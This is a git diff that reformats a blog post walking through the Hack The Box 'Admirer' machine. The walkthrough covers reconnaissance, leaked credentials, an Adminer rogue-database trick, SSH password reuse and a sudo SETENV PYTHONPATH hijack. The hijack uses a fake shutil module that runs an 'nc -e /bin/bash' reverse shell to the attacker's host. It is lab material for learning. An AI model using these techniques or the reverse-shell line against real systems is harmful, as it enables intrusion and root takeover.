@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Admirer"
-date:   2020-09-27 02:56:00 +0800
-categories: hackthebox
-tags: linux adminer sudo
+title: Hack The Box - Admirer
+date: 2020-09-27 02:56:00 +0800
+categories: [hackthebox]
+tags: [linux, adminer, sudo]
 ---
 
 ![](/assets/images/admirer.png){:height="414px" width="615px"}
@@ -14,14 +13,14 @@ The operating system that I will be using to tackle this machine is a Kali Linux
 
 What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.187 admirer.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC admirer.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 07:58 EDT
 Nmap scan report for admirer.htb (10.10.10.187)
@@ -44,7 +43,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 23.47 seconds
 
-{% endhighlight %}
+```
 
 # Enumeration (1)
 
@@ -58,7 +57,7 @@ Very nice home page but its not linked to any useful pages. Hmm... Lets check ou
 
 Unfortunately, accessing `http://admirer.htb/admin-dir/` led to a `403`, so I think its time to bust out the directory brute-forcer.
 
-{% highlight bash %}
+```bash
 $ gobuster dir -u http://admirer.htb/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 12 -k -x .php,.txt
 ===============================================================
 Gobuster v3.0.1
@@ -76,13 +75,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 /contacts.txt (Status: 200)
 /credentials.txt (Status: 200)
-{% endhighlight %}
+```
 
 Lets visit them.
 
 `http://admirer.htb/admin-dir/contacts.txt`:
 
-{% highlight raw %}
+```
 ##########
 # admins #
 ##########
@@ -112,11 +111,11 @@ Email: h.helberg@admirer.htb
 
 # Bernadette
 Email: b.rauch@admirer.htb
-{% endhighlight %}
+```
 
 `http://admirer.htb/admin-dir/credentials.txt`:
 
-{% highlight raw %}
+```
 [Internal mail account]
 w.cooper@admirer.htb
 fgJr6q#S\W:$P
@@ -128,11 +127,11 @@ ftpuser
 [Wordpress account]
 admin
 w0rdpr3ss01!
-{% endhighlight %}
+```
 
 Using the `ftp` credentials we found, we can go back to the `ftp` service.
 
-{% highlight bash %}
+```bash
 $ ftp admirer.htb
 Connected to admirer.htb.
 220 (vsFTPd 3.0.3)
@@ -148,11 +147,11 @@ ftp> dir
 -rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
 -rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
 226 Directory send OK.
-{% endhighlight %}
+```
 
 We see 2 files so lets download them and analyse them. The `dump.sql` contained nothing useful so lets see what's inside of `html.tar.gz`
 
-{% highlight bash %}
+```bash
 $ tar -xvf html.tar.gz
 $ ls -al
 total 5188
@@ -165,11 +164,11 @@ drwxr-x---  4 root www-data    4096 Dec  2  2019 images
 -rw-r-----  1 root www-data     134 Dec  1  2019 robots.txt
 drwxr-x---  2 root www-data    4096 May 28 09:38 utility-scripts
 drwxr-x---  2 root www-data    4096 Dec  2  2019 w4ld0s_s3cr3t_d1r
-{% endhighlight %}
+```
 
 In this folder were 3 interesting files. 
 
-{% highlight bash %}
+```bash
 $ index.php
 ...
                                          <?php
@@ -178,11 +177,11 @@ $ index.php
                         $password = "]F7jLHw:*G>UPrTo}~A"d6b";
                         $dbname = "admirerdb";
 ...
-{% endhighlight %}
+```
 
 Alright, we got one set of credentials. In `utility-scripts`, there was a `admin_tasks.php`.
 
-{% highlight bash %}
+```bash
 <html>
 <head>
   <title>Administrative Tasks</title>
@@ -237,7 +236,7 @@ Alright, we got one set of credentials. In `utility-scripts`, there was a `admin
   </form>
 </body>
 </html>
-{% endhighlight %}
+```
 
 If we visit it, this is how it looks:
 
@@ -245,7 +244,7 @@ If we visit it, this is how it looks:
 
 We can't inject any arbitrary commands into the `shell_exec` since the `if` check is pretty tight. Moving on, there was another file called `db_admin.php`.
 
-{% highlight bash %}
+```bash
 $ cat utility-scripts/db_admin.php
 ...
   $servername = "localhost";
@@ -256,7 +255,7 @@ $ cat utility-scripts/db_admin.php
   $conn = new mysqli($servername, $username, $password);
 ...
 // TODO: Finish implementing this or find a better open source alternative
-{% endhighlight %}
+```
 
 Cool we found some database credentials but we can't use them yet. However this page doesn't exist anymore. Could it have to do with the comment in `db_admin.php`?
 
@@ -264,11 +263,11 @@ I consulted the forums and people were saying that the name of this box was a hi
 
 ![](/assets/images/admirer4.png)
 
-{% highlight raw %}
+```
 Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.
 ...
 Usage: Just put the file adminer.css alongside adminer.php.
-{% endhighlight %}
+```
 
 The usage tells us that there is a `adminer.php`, so lets see if it's there.
 
@@ -282,12 +281,12 @@ We found our next lead! I tested out the credentials we found but they were inco
 
 First, we will need a `SQL` server. Fortunately, Kali Linux already comes with `MariaDB` installed so all we have to do is start it.
 
-{% highlight bash %}
+```bash
 $ systemctl start mysql
-{% endhighlight %}
+```
 
 Next, we will need to create a new account and assign privileges to it.
-{% highlight bash %}
+```bash
 $ mysql
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 39
@@ -306,7 +305,7 @@ MariaDB [(none)]> CREATE USER 'root'@'admirer.htb' IDENTIFIED BY 'toor';
 Query OK, 0 rows affected (0.000 sec)
 MariaDB [(none)]> GRANT ALL PRIVILEGES ON * . * TO 'root'@'admirer.htb';
 Query OK, 0 rows affected (0.000 sec)
-{% endhighlight %}
+```
 
 Now we can use `adminer.php` to access our `MariaDB` server by entering our attacker's machine IP Address as the Server, `root` as the username and `toor` as the password. The database field can be left blank.
 
@@ -334,18 +333,18 @@ We can use these new credentials to login to the database on the box but there w
 
 Thinking back, there was a `ssh` service running port `22`. Perhaps we can `ssh` with the credentials?
 
-{% highlight bash %}
+```bash
 $ ssh waldo@admirer.htb
 waldo@admirer.htb's password: &<h5b~yK3F#{PaPB&dA}{H>
 waldo@admirer:~$ cat user.txt
 a9f7XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # Enumeration (2)
 
 As `waldo`, we got `sudo` rights to run `/opt/scripts/admin_tasks.sh`.
 
-{% highlight bash %}
+```bash
 waldo@admirer:~$ sudo -l 
 [sudo] password for waldo: &<h5b~yK3F#{PaPB&dA}{H>
 Matching Defaults entries for waldo on admirer:
@@ -353,11 +352,11 @@ Matching Defaults entries for waldo on admirer:
 
 User waldo may run the following commands on admirer:
     (ALL) SETENV: /opt/scripts/admin_tasks.sh
-{% endhighlight %}
+```
 
 Lets see what's inside.
 
-{% highlight bash %}
+```bash
 waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
 #!/bin/bash
 
@@ -479,11 +478,11 @@ select opt in "${options[@]}"; do
 done
 
 exit 0
-{% endhighlight %}
+```
 
 It's quite long but if we zoom in to the `backup_web` function, we see that it is running a `python` script `/opt/scripts/backup.py`.
 
-{% highlight bash %}
+```bash
 waldo@admirer:~$ cat /opt/scripts/backup.py
 #!/usr/bin/python3
 
@@ -497,7 +496,7 @@ src = '/var/www/html/'
 dst = '/var/backups/html'
 
 make_archive(dst, 'gztar', src)
-{% endhighlight %}
+```
 
 This script simply creates a `.tar.gz` file from the contents of `/var/backups/html`. 
 
@@ -507,18 +506,18 @@ Hmm... How does the `SETENV` in the `sudo` rights come into place? With `SETENV`
 
 Since we know that the script executes `make_archive` from the `shutil` module, what we can do is create a fake `shutil` module with a fake `make_archive` function and modify the `$PYTHONPATH` variable to point to the location of our fake module and run the script! The `$PYTHONPATH` contains a list of additional directories where `Python` looks for modules for importing. 
 
-{% highlight bash %}
+```bash
 waldo@admirer:~$ cat shutil.py
 import os
 
 def make_archive(a,b,c):
     os.system("nc 10.10.XX.XX 1337 -e /bin/bash")
 
-{% endhighlight %}
+```
 
 Now, all we have to do is run `admin_task.sh`.
 
-{% highlight bash %}
+```bash
 waldo@admirer:/tmp$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh
 
 [[[ System Administration Menu ]]]
@@ -532,13 +531,13 @@ waldo@admirer:/tmp$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh
 8) Quit
 Choose an option: 6
 Running backup script in the background, it might take a while...
-{% endhighlight %}
+```
 
 # root.txt
 
 And on our listener we prepared beforehand,
 
-{% highlight bash %}
+```bash
 $ nv -lvnp 1337
 listening on [any] 1337 ...
 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.187] 56858
@@ -546,7 +545,7 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 cat /root/root.txt
 5049XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
 
